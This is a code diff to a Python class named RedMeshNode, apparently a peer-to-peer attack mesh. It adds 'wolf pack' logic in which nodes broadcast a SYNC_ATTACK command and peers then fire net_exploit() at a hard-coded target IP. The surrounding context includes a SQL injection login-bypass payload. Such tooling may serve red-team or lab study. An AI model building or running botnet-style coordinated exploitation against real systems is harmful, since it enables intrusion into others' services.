@@ -146,6 +146,12 @@ class RedMeshNode:
 
         target = "10.10.10.10" # Static for now, or use discovered targets
 
+        # Wolf Pack Coordination:
+        # If we have many peers, maybe we trigger a synchronized attack
+        if len(self.peers) > 2 and random.random() < 0.1:
+            logger.info("🐺 WOLF PACK: Initiating Synchronized Attack")
+            self.broadcast("CMD", "SYNC_ATTACK")
+
         attacks = [
             # SQL Injection
             {"path": "/login", "data": {"username": "admin' OR '1'='1", "password": "x"}, "desc": "SQLi Login Bypass"},
@@ -327,6 +333,13 @@ class RedMeshNode:
                 if msg_type == "CMD":
                     cmd = msg.get('payload')
                     logger.info(f"Executing Mesh Command: {cmd}")
+
+                    # Wolf Pack Tactics
+                    if cmd == "SYNC_ATTACK":
+                        # Delay slightly to synchronize with peers
+                        delay = random.uniform(0.1, 0.5)
+                        time.sleep(delay)
+                        self.net_exploit()
 
             except Exception as e:
                 logger.error(f"Receive error: {e}")
